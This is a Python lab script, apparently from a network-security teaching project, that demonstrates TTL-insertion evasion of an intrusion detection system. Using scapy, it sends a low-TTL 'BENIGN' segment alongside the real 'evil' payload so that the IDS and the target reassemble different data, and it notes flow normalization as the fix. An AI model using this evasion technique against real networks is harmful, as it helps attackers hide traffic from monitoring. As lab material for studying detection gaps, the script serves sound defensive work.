# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-ids-evasion: TTL insertion. LAB ONLY.

Sends a stream where one segment carries a low TTL that reaches the IDS but
expires before the host, so the IDS reassembles a different (benign-looking)
payload. Flow normalization (see stream.py) removes the ambiguity.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    base = s.IP(dst=args.dst) / s.TCP(dport=args.dport, flags="A")
    real = base / s.Raw(b"evil")
    inserted = (
        s.IP(dst=args.dst, ttl=args.low_ttl) / s.TCP(dport=args.dport, flags="A") / s.Raw(b"BENIGN")
    )
    print(f"[*] sending an inserted segment (ttl {args.low_ttl}) + the real payload to {args.dst}")
    s.send([inserted, real], verbose=0)
    verdict("ALERT", "TTL insertion sent -> IDS and host may disagree")
    return 0
